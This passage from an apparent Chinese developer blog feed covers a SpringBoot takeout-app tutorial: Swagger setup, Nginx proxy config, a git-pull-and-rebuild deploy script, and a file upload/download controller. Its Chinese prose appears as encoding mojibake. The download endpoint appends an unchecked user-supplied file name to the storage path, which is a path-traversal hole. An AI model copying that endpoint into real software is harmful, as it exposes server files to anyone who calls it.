class="hljs-attr">props:</span><br>      <span class="hljs-attr">sql:</span><br>        <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#å¼€å¯SQLæ˜¾ç¤ºï¼Œé»˜è®¤false</span><br>  <span class="hljs-attr">main:</span><br>    <span class="hljs-attr">allow-bean-definition-overriding:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#å…è®¸beanæ•°æ®æºè¦†ç›–</span><br><br><br></code></pre></td></tr></table></figure><p>â€‹</p><p>è§£è¯»ä¸€ä¸‹ymlé…ç½®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7e5c203773a04fdd9b9a096659db9749.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><strong>å…è®¸Beanå®šä¹‰è¦†ç›–å¾ˆé‡è¦</strong></p><h3 id="æµ‹è¯•-2"><a class="markdownIt-Anchor" href="#æµ‹è¯•-2"></a> æµ‹è¯•</h3><p>å¯åŠ¨é¡¹ç›®ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¯»å†™æ“ä½œåˆ†åˆ«åˆ°è¾¾äº†ä¸åŒçš„ä¸»æœºä¸Š<br />è¯»å†™åˆ†ç¦»æµ‹è¯•<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f647f0ab726e48f7a4ae0445970980d2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fd937b8b481946bba8325127319d22f9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="nginxéƒ¨ç½²"><a class="markdownIt-Anchor" href="#nginxéƒ¨ç½²"></a> Nginxéƒ¨ç½²</h1><p><a href="https://blog.csdn.net/weixin_46906696/article/details/125569407?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125569407%22,%22source%22:%22weixin_46906696%22%7D&amp;ctrtid=O48Rx">Nginxç¬”è®°</a></p><h1 id="å‰åç«¯åˆ†ç¦»å¼€å‘"><a class="markdownIt-Anchor" href="#å‰åç«¯åˆ†ç¦»å¼€å‘"></a> å‰åç«¯åˆ†ç¦»å¼€å‘</h1><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5ae7a5c5f65049e698b47a060c9b9ac8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9b200bae5d514949b1fed2860598906a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="å¼€å‘æµç¨‹"><a class="markdownIt-Anchor" href="#å¼€å‘æµç¨‹"></a> å¼€å‘æµç¨‹</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9d4d3ca75521432a999246d1ff68cea2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="yapi"><a class="markdownIt-Anchor" href="#yapi"></a> YApi</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b56ddabf9931461dab56dafdd5614088.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="swaggerå¸¸ç”¨"><a class="markdownIt-Anchor" href="#swaggerå¸¸ç”¨"></a> Swaggerï¼ˆå¸¸ç”¨ï¼‰</h2><p>ä¸»è¦ä½œç”¨å°±æ˜¯å¸®åŠ©åç«¯äººå‘˜ç”Ÿæˆåç«¯æ¥å£æ–‡æ¡£çš„<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7352d150c2b64d3e9c84f15ce56c7c1d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä½¿ç”¨æ–¹å¼<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b22b2f0ae0c04a4db76fe8e8fa047615.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¼å…¥åæ ‡</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--knife4jæ¥å£ç®¡ç†--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>å¯¼å…¥é…ç½®ç±»</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221126213937943.png" alt="image-20221126213937943" /></p><p>å…·ä½“é…ç½®ä½ç½®<code>com.xyy.config.WebMvcConfig</code></p><p>å¯åŠ¨æœåŠ¡ï¼Œè®¿é—®è·¯å¾„+doc.html<br />è¿›å…¥ä¹‹åå°±å¯ä»¥å¯¹å·²æœ‰çš„æ¥å£è¿›è¡Œç®¡ç†äº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/28fa1199bed745909c1ab3566ef46517.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="swaggerå¸¸ç”¨æ³¨è§£"><a class="markdownIt-Anchor" href="#swaggerå¸¸ç”¨æ³¨è§£"></a> Swaggerå¸¸ç”¨æ³¨è§£</h2><p>ç›´æ¥ç”Ÿæˆçš„æ³¨è§£å†…å®¹å¹¶ä¸æ˜¯å¾ˆå®Œå–„<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7b2482af3df7429ea060c692c9778524.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />Swaggerå¸¸ç”¨æ³¨è§£<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/96378f7383e34de1a6ef9f7785989c2d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä»¥å®ä½“ç±»ä¸ºä¾‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0fbe9d3e59ee47d0b5a9f8d6b21609af.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />Controllerä¸Šçš„æ³¨è§£<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/920dcfe50e8544f0ab5a42581722b3e3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä»¥ä¸Šå‡ä¸ºç¤ºä¾‹ï¼Œæœ€ç»ˆå®Œå–„å¥½æ³¨è§£ï¼Œæ–‡æ¡£ä¼šæ›´å¥½ç”¨ï¼Œæ›´è¯¦ç»†ã€‚</p><h1 id="é¡¹ç›®éƒ¨ç½²"><a class="markdownIt-Anchor" href="#é¡¹ç›®éƒ¨ç½²"></a> é¡¹ç›®éƒ¨ç½²</h1><h2 id="å‰ç«¯"><a class="markdownIt-Anchor" href="#å‰ç«¯"></a> å‰ç«¯</h2><p>å‰ç«¯ä½œä¸ºä¸€ä¸ªå·¥ç¨‹ï¼ŒåŒæ ·éœ€è¦æ‰“åŒ…ï¼Œæ‰“åŒ…å®Œä¸ºdistç›®å½•<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a2cee8e970754767bf5efab50eb3d065.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æŠŠè¿™ä¸ªdistç›®å½•ï¼Œæ‰”è¿›Nginxé‡ŒHTMLæ–‡ä»¶å¤¹å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªé™æ€èµ„æº<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e05ae7caf6ce4c82b5dd35e96ba97059.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¼ ä¸Šæ¥ä¸ç®—å®Œï¼Œè¿˜è¦å¥½å¥½é…ç½®ä¸€ä¸‹<br />ä¸€ä¸ªæ˜¯é™æ€èµ„æºï¼Œå¦ä¸€ä¸ªæ˜¯åå‘ä»£ç†</p><h3 id="é™æ€èµ„æºé…ç½®"><a class="markdownIt-Anchor" href="#é™æ€èµ„æºé…ç½®"></a> é™æ€èµ„æºé…ç½®</h3><p>å…ˆé…ç½®é™æ€èµ„æº<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/85400722cc984e53bc62af167a80ba13.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="è¯·æ±‚ä»£ç†é…ç½®"><a class="markdownIt-Anchor" href="#è¯·æ±‚ä»£ç†é…ç½®"></a> è¯·æ±‚ä»£ç†é…ç½®</h3><p>é‡å¯Nginxï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œè®¿é—®ã€‚<br />éšä¾¿ä¸€ä¸ªè¯·æ±‚å¯ä»¥çœ‹åˆ°ï¼Œå¸¦äº†å‰ç¼€<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221126220228420.png" alt="image-20221126220228420" /><br />åç«¯é¡¹ç›®ç»™çš„ç«¯å£æ˜¯9001<br />è¯·æ±‚è·¯å¾„ä¸ºï¼š<a href="http://www.ccsmile.fun:9001/api/employee/login">http://www.ccsmile.fun:9001/api/employee/login</a><br />æˆ‘ä»¬åç«¯æ˜¯æ²¡æœ‰è¿™ä¸ªapiçš„å‰ç¼€çš„<br />é€šè¿‡é‡å†™urlï¼Œå°±å¯ä»¥æŠŠ<br /><code>http://localhost:81/api/employee/page?page=1&amp;pageSize=10</code><br />å˜æˆ<br /><code>http://192.168.132.23:8080/employee/page?page=1&amp;pageSize=10</code>çš„è¯·æ±‚åœ°å€ï¼Œè¿™æ ·å°±å®Œæˆäº†è¯·æ±‚ä»£ç†è½¬å‘æ“ä½œ<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221126220352391.png" alt="image-20221126220352391" /><br />é…ç½®æ–‡ä»¶å¦‚ä¸‹</p>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json">server<span class="hljs-punctuation">&#123;</span><br>  listen <span class="hljs-number">80</span>;<br>  server_name localhost;<br>#é™æ€èµ„æºé…ç½®<br>  location /<span class="hljs-punctuation">&#123;</span><br>    root html/dist;<br>    index index.html;<br>  <span class="hljs-punctuation">&#125;</span><br>#è¯·æ±‚è½¬å‘ä»£ç†ï¼Œé‡å†™URL+è½¬å‘<br>  location ^~ /api/<span class="hljs-punctuation">&#123;</span><br>          rewrite ^/api/(.*)$ /$<span class="hljs-number">1</span> break;<br>          proxy_pass http<span class="hljs-punctuation">:</span><span class="hljs-comment">//åç«¯æœåŠ¡ip:ç«¯å£å·;</span><br>  <span class="hljs-punctuation">&#125;</span><br>#å…¶ä»–<br>  error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /<span class="hljs-number">50</span>x.html;<br>  location = /<span class="hljs-number">50</span>x.html<span class="hljs-punctuation">&#123;</span><br>      root html;<br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>æœ€åä¿å­˜æ–‡ä»¶ï¼Œé‡å¯Nginxï¼Œå°±é…ç½®å®Œæˆäº†</p><h2 id="åç«¯"><a class="markdownIt-Anchor" href="#åç«¯"></a> åç«¯</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/23e1f1e20f0b420ca3fa8856aa07efaa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¸Šä¼ è„šæœ¬ï¼Œè‡ªåŠ¨æ‹‰å–æœ€æ–°è„šæœ¬<br />è¿™æ ·åœ¨å¼€å‘ç«¯å’ŒLinuxç«¯å°±é€šè¿‡Giteeé—´æ¥å®ç°åŒæ­¥äº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c2cf53f4a6044202b5e5b7136a9bc0ef.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è„šæœ¬å†…å®¹</p><p>â€‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> =================================<br><span class="hljs-built_in">echo</span>  è‡ªåŠ¨åŒ–éƒ¨ç½²è„šæœ¬å¯åŠ¨<br><span class="hljs-built_in">echo</span> =================================<br><br><span class="hljs-built_in">echo</span> åœæ­¢åŸæ¥è¿è¡Œä¸­çš„å·¥ç¨‹<br>APP_NAME=reggie_take_out<br><br>tpid=`ps -ef|grep <span class="hljs-variable">$APP_NAME</span>|grep -v grep|grep -v <span class="hljs-built_in">kill</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;tpid&#125;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Stop Process...&#x27;</span><br>    <span class="hljs-built_in">kill</span> -15 <span class="hljs-variable">$tpid</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">sleep</span> 2<br>tpid=`ps -ef|grep <span class="hljs-variable">$APP_NAME</span>|grep -v grep|grep -v <span class="hljs-built_in">kill</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;tpid&#125;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Kill Process!&#x27;</span><br>    <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$tpid</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Stop Success!&#x27;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> å‡†å¤‡ä»Gitä»“åº“æ‹‰å–æœ€æ–°ä»£ç <br><span class="hljs-built_in">cd</span> /usr/local/javaapp/reggie_take_out<br><br><span class="hljs-built_in">echo</span> å¼€å§‹ä»Gitä»“åº“æ‹‰å–æœ€æ–°ä»£ç <br>git pull<br><span class="hljs-built_in">echo</span> ä»£ç æ‹‰å–å®Œæˆ<br><br><span class="hljs-built_in">echo</span> å¼€å§‹æ‰“åŒ…<br>output=`mvn clean package -Dmaven.test.skip=<span class="hljs-literal">true</span>`<br><br><span class="hljs-built_in">cd</span> target<br><br><span class="hljs-built_in">echo</span> å¯åŠ¨é¡¹ç›®<br><span class="hljs-built_in">nohup</span> java -jar reggie_take_out-1.0-SNAPSHOT.jar &amp;&gt; reggie_take_out.log &amp;<br><span class="hljs-built_in">echo</span> é¡¹ç›®å¯åŠ¨å®Œæˆ<br><br><br><br></code></pre></td></tr></table></figure><p>â€‹<br />â€‹</p><p>æ‰§è¡Œè„šæœ¬å°±OKäº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/079d294160f94539b7b3db5d09af969e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>è®°å¾—ä¿®æ”¹ymlæ–‡ä»¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæ¯”å¦‚æ–‡ä»¶è·¯å¾„ç­‰ç­‰ä¿¡æ¯~<br />å®Œç»“æ’’èŠ±å•¦</p><ol><li><a href="https://www.bilibili.com/video/BV13a411q753?p=176&amp;spm_id_from=pageDriver&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">é»‘é©¬ç¨‹åºå‘˜Javaé¡¹ç›®å®æˆ˜ã€Šç‘å‰å¤–å–ã€‹ï¼Œè½»æ¾æŒæ¡springboot + mybatis pluså¼€å‘æ ¸å¿ƒæŠ€æœ¯çš„çœŸjavaå®æˆ˜é¡¹ç›® </a></li><li>é£åŸProçš„<a href="https://blog.csdn.net/weixin_46906696/article/details/125040457#comments_23962173">ç‘å‰å¤–å–ç¬”è®°</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Webé¡¹ç›®</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>é¡¹ç›®</tag>
      
      <tag>ç‘å‰å¤–å–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBootå°†æ–‡ä»¶ä¸Šä¼ åˆ°é¡¹ç›®çš„æ ¹è·¯å¾„ä¸­ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„</title>
    <link href="/2022/11/25/SpringBoot%E5%B0%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84/"/>
    <url>/2022/11/25/SpringBoot%E5%B0%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringBootå°†æ–‡ä»¶ä¸Šä¼ åˆ°é¡¹ç›®çš„æ ¹è·¯å¾„ä¸­ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„"><a href="#SpringBootå°†æ–‡ä»¶ä¸Šä¼ åˆ°é¡¹ç›®çš„æ ¹è·¯å¾„ä¸­ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„" class="headerlink" title="SpringBootå°†æ–‡ä»¶ä¸Šä¼ åˆ°é¡¹ç›®çš„æ ¹è·¯å¾„ä¸­ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„"></a>SpringBootå°†æ–‡ä»¶ä¸Šä¼ åˆ°é¡¹ç›®çš„æ ¹è·¯å¾„ä¸­ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„</h1><ol><li><p>application.yml</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185250894.png" alt="image-20221125185250894"></p></li><li><p><strong>controller</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java">RestController<br><span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonController</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;takeOutFile.fileLocation:&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String filePath;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ–‡ä»¶ä¸Šä¼ </span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> file org.springframework.web.multipart.MultipartFile</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> com.xyy.reggie.common.R&lt;java.lang.String&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> &#123;<br><br>        <span class="hljs-comment">//åŸå§‹æ–‡ä»¶å</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>        <span class="hljs-keyword">assert</span> originalFilename != <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>        <span class="hljs-comment">//ä½¿ç”¨UUIDé‡æ–°ç”Ÿæˆæ–‡ä»¶åï¼Œé˜²æ­¢æ–‡ä»¶åç§°é‡å¤é€ æˆæ–‡ä»¶è¦†ç›–</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString() + suffix;<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç›®å½•å¯¹è±¡</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-comment">//åˆ¤æ–­å½“å‰ç›®å½•æ˜¯å¦å­˜åœ¨</span><br>        <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>            <span class="hljs-comment">//ç›®å½•ä¸å­˜åœ¨ï¼Œéœ€è¦åˆ›å»º</span><br>            dir.mkdirs();<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir.getAbsolutePath() +File.separator+ fileName));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> R.success(fileName);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ–‡ä»¶ä¸‹è½½</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name     java.lang.String</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> response javax.servlet.http.HttpServletResponse</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è¾“å…¥æµï¼Œé€šè¿‡è¾“å…¥æµè¯»å–æ–‡ä»¶å†…å®¹</span><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath +File.separator+  name));<br><br>            <span class="hljs-comment">//è¾“å‡ºæµï¼Œé€šè¿‡è¾“å‡ºæµå°†æ–‡ä»¶å†™å›æµè§ˆå™¨</span><br>            <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><br>            response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>                outputStream.flush();<br>            &#125;<br><br>            <span class="hljs-comment">//å…³é—­èµ„æº</span><br>            outputStream.close();<br>            fileInputStream.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125185348635.png" alt="image-20221125185348635"></p></li></ol><blockquote><p>SpringBootæ–‡ä»¶ä¸Šä¼ ä¸‹è½½æ€ä¹ˆä½¿ç”¨å°±ä¸è¯´äº†ï¼Œè¯´è¯´æ€ä¹ˆä½¿ç”¨<strong>ç›¸å¯¹è·¯å¾„</strong>æŠŠæ–‡ä»¶å­˜å‚¨åˆ°é¡¹ç›®æ ¹ç›®å½•å»</p></blockquote><ol start="4"><li><p>ä»£ç åˆ†æ</p><ol><li><p>æˆ‘ä»¬ä½¿ç”¨<code>MultipartFileçš„transferTo()</code>è¿›è¡Œæ–‡ä»¶æœ¬åœ°æŒä¹…åŒ–</p></li><li><p>ä½†æ˜¯<code>MultipartFileçš„transferTo()</code>æ–¹æ³•ä¼šç›‘æµ‹ä¼ å…¥å…¶ä¸­çš„Fileå¯¹è±¡çš„è·¯å¾„æ˜¯å¦ä¸ºç»å¯¹è·¯å¾„ï¼Œå¦‚æœä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œ&#x3D;&#x3D;ä¼šè‡ªåŠ¨æ‹¼æ¥applicationé‡Œè®¾ç½®çš„è·¯å¾„ å’Œ \work\Tomcat\localhost\ROOT&#x3D;&#x3D;ã€‚</p><p>æ‰€ä»¥å‡ºç°</p><p>java.io.FileNotFoundException: C:\Users\XXX\AppData\Local\Temp\tomcat.8080.6103676472064121995\work\Tomcat\localhost\ROOT\src\main\resources\takeOutFiled10b193c1-c840-4570-88c3-874ef18e73b5.png (ç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šçš„è·¯å¾„ã€‚)</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221125190148520.png" alt="image-20221125190148520" style="zoom: 100%;" 